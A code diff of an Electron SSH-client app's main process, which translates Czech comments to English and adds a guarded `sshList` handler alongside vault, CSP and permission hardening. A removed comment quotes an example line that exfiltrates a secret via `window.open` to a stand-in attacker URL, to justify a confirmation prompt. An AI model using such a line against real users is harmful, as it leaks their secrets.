@@ -39,7 +39,7 @@ const isDev = !app.isPackaged
 let mainWindow: BrowserWindow | null = null
 let autoLockTimer: NodeJS.Timeout | null = null
 
-/* ------------------------------------------------------------------ okno */
+/* ----------------------------------------------------------------- window */
 
 function createWindow(): void {
   mainWindow = new BrowserWindow({
@@ -62,16 +62,10 @@ function createWindow(): void {
 
   mainWindow.once('ready-to-show', () => mainWindow?.show())
 
-  // Externí odkazy do systémového prohlížeče, nikdy do okna aplikace.
-  //
-  // Schéma se kontroluje kotveným výrazem, takže `file:`, `javascript:` ani SMB
-  // cesty neprojdou. To ale nestačí: `shell.openExternal` neřídí CSP, takže
-  // `window.open('https://utocnik/?d=' + tajemstvi)` byl použitelný jako
-  // exfiltrační kanál — a odkazy v terminálovém výstupu jsou klikatelné, takže
-  // ten výstup nemusí pocházet od uživatele.
-  //
-  // Proto se uživatel zeptá. Dialog ukazuje **celou** adresu, ne zkrácenou:
-  // zkrácení je přesně to, čím se exfiltrační URL schová.
+  // External links go to the system browser, never into the app window; the
+  // anchored scheme test keeps `file:`, `javascript:` and SMB paths out. Prompt
+  // anyway: `openExternal` bypasses CSP, and terminal output holds clickable
+  // links the user never typed. Show the URL in full — truncation hides it.
   mainWindow.webContents.setWindowOpenHandler(({ url }) => {
     if (!/^https?:\/\//.test(url)) return { action: 'deny' }
 
@@ -114,9 +108,7 @@ function createWindow(): void {
 }
 
 function applyCsp(): void {
-  // Same policy the meta tag carries, from the same source. Both apply and CSP
-  // intersects them, so they must agree; see src/shared/csp.ts for why there
-  // used to be two and why the strict one never reached users.
+  // Must stay identical to the meta tag: both apply and CSP intersects them.
   const policy = contentSecurityPolicy(isDev)
 
   electronSession.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -128,18 +120,14 @@ function applyCsp(): void {
     })
   })
 
-  // Aplikace nepotřebuje kameru, mikrofon ani nic podobného.
-  //
-  // Both handlers, because Electron asks through two different doors. The
-  // request handler covers the asynchronous permission prompts; the check
-  // handler covers the SYNCHRONOUS path, which several permissions take
-  // instead — and an unset check handler defaults to allowing them. Setting
-  // only one of the two leaves the other wide open, which is what this was.
+  // Both handlers are required: the request handler covers the asynchronous
+  // prompts, the check handler the synchronous path several permissions take
+  // instead — and an unset check handler defaults to allowing them.
   electronSession.defaultSession.setPermissionRequestHandler((_wc, _perm, cb) => cb(false))
   electronSession.defaultSession.setPermissionCheckHandler(() => false)
 }
 
-/* ------------------------------------------------------- automatické zamčení */
+/* -------------------------------------------------------------- auto-lock */
 
 function resetAutoLock(): void {
   if (autoLockTimer) clearTimeout(autoLockTimer)
@@ -156,7 +144,6 @@ function doLock(): void {
   if (!vault.isUnlocked()) return
   const disconnect = vault.read().settings.disconnectOnLock
   if (disconnect) ssh.disconnectAll()
-  // Zamčený trezor nemá co nabízet – MCP server hned zavíráme.
   void mcp.stopOnLock().then(pushMcpStatus)
   approvals.rejectAll()
   vault.lock()
@@ -165,13 +152,12 @@ function doLock(): void {
   mainWindow?.webContents.send(CH.vaultLockedEvent)
 }
 
-/* ------------------------------------------------- schvalovací fronta MCP */
+/* ----------------------------------------------------- MCP approval queue */
 
 function pushMcpStatus(): void {
   mainWindow?.webContents.send(CH.mcpStatusEvent, mcp.status())
 }
 
-/** Po odemčení trezoru nastartuje MCP server, pokud je zapnutý v nastavení. */
 async function syncMcp(): Promise<void> {
   if (!vault.isUnlocked()) return
   const wanted = Boolean(vault.read().settings.mcpEnabled)
@@ -192,9 +178,8 @@ function registerMcpBridge(): void {
 
     sendShare: (req: ShareRequest) => mainWindow?.webContents.send(CH.mcpShareRequestEvent, req),
 
-    // Raising is the queue's call, not the tool's: a raise per request is
-    // flashFrame in a loop on Windows, and only the queue can tell whether a
-    // dialog is already up.
+    // Raising is the queue's call, not the tool's: one raise per request means
+    // flashFrame in a loop on Windows, and only the queue knows if a dialog is up.
     raiseWindow: () => {
       if (!mainWindow) return
       if (mainWindow.isMinimized()) mainWindow.restore()
@@ -207,26 +192,17 @@ function registerMcpBridge(): void {
   mcp.bind(approvals)
 }
 
-/* ----------------------------------------------------------------- pomůcky */
+/* ---------------------------------------------------------------- helpers */
 
 function ok<T>(value: T): Result<T> {
   return { ok: true, value }
 }
 
 /**
- * The error the renderer is allowed to see.
- *
- * An `AppError` was raised by this application deliberately: its message is a
- * translated sentence written for the person reading it, so it goes through
- * whole. Anything else came from node, from Electron or from a library, and
- * those messages carry absolute paths (`ENOENT: … C:\Users\stan\AppData\…`),
- * internal state and sometimes a fragment of the input that caused them. The
- * renderer displays what it is given, so that lands in front of the user, in a
- * window whose content is not something we want to be quotable in a screenshot
- * or a bug report.
- *
- * The raw error still reaches the console, where the developer wants it and
- * where it is not part of the UI.
+ * The only error text the renderer may see. An `AppError` is ours — a translated
+ * sentence meant for the user — so it passes through whole. Anything else came
+ * from node, Electron or a library and can carry absolute paths, internal state
+ * or a fragment of the offending input, so only the console gets it.
  */
 function fail(err: unknown): Result<never> {
   const key = (err as { key?: unknown } | null | undefined)?.key
@@ -237,7 +213,6 @@ function fail(err: unknown): Result<never> {
   return { ok: false, error: t('error.unexpected') }
 }
 
-/** Registrace handleru s jednotným zabalením chyb do `Result`. */
 function handle<T>(channel: string, fn: (...args: any[]) => Promise<T> | T): void {
   ipcMain.handle(channel, async (_event, ...args) => {
     try {
@@ -282,10 +257,7 @@ function toMeta(c: {
   }
 }
 
-/**
- * Aplikuje hodnotu tajemství podle sémantiky ConnectionInput:
- * undefined = beze změny, '' = smazat, jinak nastavit.
- */
+/** `ConnectionInput` secrets: `undefined` keeps, `''` clears, anything else replaces. */
 function applySecret(current: string | undefined, incoming: string | undefined): string | undefined {
   if (incoming === undefined) return current
   if (incoming === '') return undefined
@@ -305,19 +277,16 @@ function validateInput(input: ConnectionInput): void {
   }
 }
 
-/* ------------------------------------------------------- kotva proti vrácení */
+/* -------------------------------------------------------- rollback anchor */
 
 /**
- * Předá trezoru pečetidlo postavené na platformním trezoru hesel.
+ * Hands the vault a sealer backed by the platform keyring. It lives here and not
+ * in `vault.ts` because `safeStorage` is a named export of `electron` and the
+ * test files stub only `app`, so importing it there breaks them all at load.
  *
- * Sem to patří, a ne do `vault.ts`: `safeStorage` je pojmenovaný export
- * z `electron` a testovací soubory stubují jen `app`, takže import v trezoru
- * je shodí už při načtení, ne v jednom testu.
- *
- * `basic_text` je na Linuxu záložní backend, který data jen zakóduje. Electron
- * u něj `isEncryptionAvailable()` hlásí `true`, což by kotvu označilo za
- * chráněnou, aniž by byla — a to je horší než přiznaná nechráněná kotva.
- * Nedostupnost se neřeší dialogem: je to fakt, se kterým uživatel nic neudělá.
+ * Linux's `basic_text` fallback merely encodes the data, yet Electron reports
+ * `isEncryptionAvailable()` as true for it — accepting that would mark the
+ * anchor protected when it is not, which is worse than an admittedly bare one.
  */
 function installGuardSealer(): void {
   let usable = false
@@ -345,7 +314,7 @@ function installGuardSealer(): void {
 /* --------------------------------------------------------------------- IPC */
 
 function registerIpc(): void {
-  /* trezor */
+  /* vault */
   handle(CH.vaultStatus, async (): Promise<VaultStatus> => {
     const guard = vault.rollback
     return {
@@ -373,8 +342,8 @@ function registerIpc(): void {
     return null
   })
 
-  // Vrací nový obnovovací klíč — obnova rotuje datový klíč, takže ten použitý
-  // přestal platit. UI ho musí zobrazit, jinak uživatel zůstane bez záchrany.
+  // Returns a fresh recovery key: recovery rotates the data key, so the one
+  // just used is dead. The UI must show it or the user is left with no way in.
   handle(CH.vaultUnlockWithRecovery, async (recoveryKey: string, newPassword: string) => {
     const fresh = await vault.unlockWithRecovery(recoveryKey, newPassword)
     resetAutoLock()
@@ -387,15 +356,14 @@ function registerIpc(): void {
     return null
   })
 
-  // Vrací nový obnovovací klíč, pokud trezor nějaký měl. Změna hesla rotuje
-  // datový klíč a starý obnovovací wrap pod nový DEK postavit nejde — klíč se
-  // nikde neukládá. UI ho musí zobrazit.
+  // Also returns a fresh recovery key if the vault had one: the DEK rotates and
+  // the old wrap cannot be rebuilt, since the recovery key is never stored.
   handle(CH.vaultChangePassword, (oldPw: string, newPw: string) =>
     vault.changePassword(oldPw, newPw)
   )
 
-  // Heslo je povinné: rotace DEK ho potřebuje, a bez něj stačila odemčená
-  // relace na vydání klíče, který trezor otevírá navždy.
+  // The password is mandatory: rotating the DEK needs it, and without it an
+  // unlocked session alone could mint a key that opens the vault forever.
   handle(CH.vaultRegenerateRecovery, (password: string) =>
     vault.regenerateRecoveryKey(password)
   )
@@ -405,7 +373,7 @@ function registerIpc(): void {
     return null
   })
 
-  /* připojení */
+  /* connections */
   handle(CH.connList, (): ConnectionMeta[] =>
     vault
       .read()
@@ -476,7 +444,7 @@ function registerIpc(): void {
     })
   )
 
-  /* příkazy a poznámky */
+  /* commands and notes */
   handle(CH.snipList, (): Snippet[] =>
     [...vault.read().snippets].sort((a, b) => collator().compare(a.title, b.title))
   )
@@ -486,7 +454,7 @@ function registerIpc(): void {
     if (!input.body?.trim()) throw appError('error.fillBody')
     if (!['command', 'note'].includes(input.kind)) throw appError('error.invalidKind')
 
-    // Konce řádků sjednotíme na LF – CRLF by se v shellu projevilo jako ^M.
+    // Normalize line endings to LF — CRLF shows up as ^M in the shell.
     const body = normalizeNewlines(input.body)
 
     return vault.mutate((data) => {
@@ -544,7 +512,7 @@ function registerIpc(): void {
     })
   )
 
-  /* nastavení */
+  /* settings */
   handle(CH.settingsGet, (): Settings => {
     const d = vault.read()
     return { ...DEFAULT_SETTINGS, ...d.settings, hasAiApiKey: Boolean(d.aiApiKey) }
@@ -560,14 +528,9 @@ function registerIpc(): void {
     return { ...saved, hasAiApiKey: Boolean(vault.read().aiApiKey) }
   })
 
-  /* známé hostitele */
+  /* known hosts */
   handle(CH.hostsList, (): KnownHost[] =>
-    // `hostKey` is `host:port` — a name the user reads and scans, not an opaque
-    // identifier. An earlier comment here claimed it was base64 and used that to
-    // justify a code-unit sort; it was simply wrong about the data. So this gets
-    // the same collator as the other two lists, which also means `web2` sorts
-    // before `web10` and `Zeta` next to `zeta` rather than before every
-    // lowercase name.
+    // `hostKey` is `host:port`, a name the user reads — sort it like the rest.
     [...vault.read().knownHosts].sort((a, b) => collator().compare(a.hostKey, b.hostKey))
   )
 
@@ -579,12 +542,18 @@ function registerIpc(): void {
   })
 
   /* SSH */
+  // Every SSH I/O path goes through `requireUnlockedPublic()`: the renderer
+  // drops its tab list on `vault:locked` but the main process keeps the clients,
+  // so an unguarded `write`/`resize` would still type into the remote shell.
   //
-  // Každá cesta k SSH I/O prochází `requireUnlocked()`. Zamčení trezoru dřív
-  // nebylo hranicí: renderer sice smazal seznam záložek, ale hlavní proces
-  // relace držel dál a `write`/`resize` nikdo nehlídal — takže zamčená
-  // aplikace pořád uměla psát do vzdáleného shellu. Zámek buď znamená konec
-  // přístupu, nebo neznamená nic.
+  // `sshList` exists because locking is not disconnecting — with
+  // `disconnectOnLock` off the clients stay connected on purpose, and with no
+  // way to re-adopt them after unlock they stay live, authenticated and
+  // invisible while MCP can still run commands on them.
+  handle(CH.sshList, () => {
+    vault.requireUnlockedPublic()
+    return ssh.list()
+  })
   handle(CH.sshConnect, (connectionId: string) => {
     vault.requireUnlockedPublic()
     return ssh.connect(connectionId)
@@ -608,15 +577,18 @@ function registerIpc(): void {
     return null
   })
 
-  /* dialogy */
+  /* dialogs */
   handle(CH.dialogReadTextFile, async (title: string) => {
     if (!mainWindow) return null
     const res = await dialog.showOpenDialog(mainWindow, {
-      title: title || 'Vybrat soubor',
+      title: title || t('dialog.selectFile'),
       properties: ['openFile'],
       filters: [
-        { name: 'Privátní klíče', extensions: ['pem', 'key', 'ppk', 'rsa', 'ed25519', 'pub', ''] },
-        { name: 'Všechny soubory', extensions: ['*'] }
+        {
+          name: t('dialog.privateKeys'),
+          extensions: ['pem', 'key', 'ppk', 'rsa', 'ed25519', 'pub', '']
+        },
+        { name: t('dialog.allFiles'), extensions: ['*'] }
       ]
     })
     if (res.canceled || res.filePaths.length === 0) return null
@@ -627,9 +599,9 @@ function registerIpc(): void {
   handle(CH.dialogSaveTextFile, async (suggestedName: string, content: string) => {
     if (!mainWindow) return null
     const res = await dialog.showSaveDialog(mainWindow, {
-      title: 'Uložit soubor',
+      title: t('dialog.saveFile'),
       defaultPath: suggestedName,
-      filters: [{ name: 'Textový soubor', extensions: ['txt'] }]
+      filters: [{ name: t('dialog.textFile'), extensions: ['txt'] }]
     })
     if (res.canceled || !res.filePath) return null
     await fsp.writeFile(res.filePath, String(content ?? ''), { encoding: 'utf8', mode: 0o600 })
@@ -677,14 +649,14 @@ function registerIpc(): void {
     return null
   })
 
-  /* schránka (sandboxovaný preload k ní nemá přímý přístup) */
+  /* clipboard (the sandboxed preload has no direct access to it) */
   handle(CH.clipboardRead, () => clipboard.readText())
   handle(CH.clipboardWrite, (text: string) => {
     clipboard.writeText(String(text ?? ''))
     return null
   })
 
-  /* aplikace */
+  /* app */
   ipcMain.on(CH.appActivity, () => resetAutoLock())
   handle(CH.appVersion, () => app.getVersion())
 
@@ -697,16 +669,8 @@ function registerIpc(): void {
 }
 
 /**
- * Sorts the way the user's own language does.
- *
- * Was `localeCompare(x, 'cs')` on two lists and a bare `localeCompare` on a
- * third — so a German user got Czech collation for their connections and
- * whatever the OS felt like for their known hosts. Neither matched the language
- * they had chosen in the app.
- *
- * Built per call rather than cached: the locale changes while the app runs, and
- * a collator captured at module load would keep sorting by the old one. These
- * lists are short and rebuilt on demand, so the cost does not matter.
+ * Built per call, not cached: the locale changes while the app runs, and a
+ * collator captured at module load would keep sorting by the old one.
  */
 function collator(): Intl.Collator {
   return new Intl.Collator(currentLocale(), { sensitivity: 'base', numeric: true })
@@ -734,13 +698,10 @@ if (!gotLock) {
   })
 
   void app.whenReady().then(async () => {
-    // Projekt se dřív jmenoval jinak; přeneseme trezor ze staré složky profilu.
     const migratedFrom = await migrateLegacyProfile(['PuttyUI', 'putty-ui']).catch(
       (err: unknown) => {
-        // Non-fatal — a failed move must not keep the app from starting. But it
-        // is the upgrade path where the user's vault is still in the old profile
-        // directory, so silence here reads to them as a vault that vanished, and
-        // this log is the only thing that says otherwise.
+        // Non-fatal: a failed move must not block startup. But this is the
+        // upgrade path, so the log is the only sign the vault did not vanish.
         console.error('Legacy profile migration failed:', err)
         return null
       }
@@ -770,15 +731,10 @@ if (!gotLock) {
   })
 
   /**
-   * On macOS the last window closing is not the end of the app.
-   *
-   * Everywhere else this quits, and `before-quit` then rejects approvals, stops
-   * the gateway and locks the vault. On darwin the process stays resident with
-   * no window at all — `before-quit` does not run until the user actually
-   * quits — so without this the vault would sit unlocked in memory and the MCP
-   * gateway would keep answering tool calls whose approval dialog has nowhere
-   * to appear. `doLock()` is the same teardown an auto-lock does; `activate`
-   * builds a fresh window onto the lock screen.
+   * On macOS the process stays resident after the last window closes and
+   * `before-quit` does not run, so without this the vault would sit unlocked in
+   * memory while the MCP gateway kept answering tool calls whose approval dialog
+   * has nowhere to appear. `activate` rebuilds a window onto the lock screen.
    */
   app.on('window-all-closed', () => {
     ssh.disconnectAll()
